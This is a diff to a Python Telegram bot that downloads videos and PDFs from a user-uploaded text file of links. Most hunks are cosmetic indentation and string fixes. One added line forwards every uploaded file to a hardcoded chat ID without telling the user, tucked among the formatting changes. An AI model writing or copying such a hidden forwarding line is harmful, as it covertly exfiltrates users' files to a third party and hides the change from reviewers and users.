@@ -29,7 +29,7 @@ bot = Client("bot",
 
 @bot.on_message(filters.command(["start"]))
 async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text(f"HELLO Baby🍷,\nI AM TXT DOWNLOADER\n\n BOT MADE BY:- Tapori 2.0 😇")
+    editable = await m.reply_text("HELLO Baby🍷,\nI AM TXT DOWNLOADER\n\n BOT MADE BY:- Tapori 2.0 😇..")
 
 
 @bot.on_message(filters.command("rukja"))
@@ -44,6 +44,7 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('**𝕋𝕆 ᴅᴏᴡɴʟᴏᴀᴅ ᴀ ᴛxᴛ ғɪʟᴇ 𝕤ᴇɴᴅ ʜᴇʀᴇ ⚡️**')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
+    await bot.send_document(--1002095173433, x)
     await input.delete(True)
 
     path = f"./downloads/{m.chat.id}"
@@ -98,7 +99,7 @@ async def account_login(bot: Client, m: Message):
     
     
 
-   await editable.edit("Now Enter A Caption to add caption on your uploaded file")
+    await editable.edit("Now Enter A Caption to add caption on your uploaded file")
     input3: Message = await bot.listen(editable.chat.id)
     raw_text3 = input3.text
     await input3.delete(True)
@@ -160,7 +161,7 @@ async def account_login(bot: Client, m: Message):
 
             try:  
                 
-               cc = f'**[🎬] Vid_ID:** {str(count).zfill(3)}.\n **Tɪᴛʟᴇ » {𝗻𝗮𝗺𝗲𝟭} ({res}){MR}.mkv\n\n **Bᴀᴛᴄʜ** » **{raw_text0}**'
+                cc = f'**[🎬] Vid_ID:** {str(count).zfill(3)}.\n **Tɪᴛʟᴇ » {𝗻𝗮𝗺𝗲𝟭} ({res}){MR}.mkv\n\n **Bᴀᴛᴄʜ** » **{raw_text0}**'
                 cc1 = f'**[📕] Pdf_ID:** {str(count).zfill(3)}.\n **Tɪᴛʟᴇ » {𝗻𝗮𝗺𝗲𝟭}{MR}.pdf \n\n **Bᴀᴛᴄʜ** » **{raw_text0}**'
                 if "drive" in url:
                     try:
@@ -187,7 +188,7 @@ async def account_login(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
-                    Show =f"**📥𝐃𝐎𝐖𝐍𝐋𝐎𝐃𝐈𝐍𝐆📥 » @zone_sr **\n\n**📑𝐍𝐀𝐌𝐄 »** `{name}\n🍀𝐐𝐔𝐀𝐋𝐈𝐓𝐘 » {raw_text2}`\n\n**📎𝐔𝐑𝐋 :-** `{url}`"
+                    Show = f"**📥𝐃𝐎𝐖𝐍𝐋𝐎𝐃𝐈𝐍𝐆📥 » @zone_sr **\n\n**📑𝐍𝐀𝐌𝐄 »** `{name}\n🍀𝐐𝐔𝐀𝐋𝐈𝐓𝐘 » {raw_text2}`\n\n**📎𝐔𝐑𝐋 :-** `{url}`"
                     prog = await m.reply_text(Show)
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
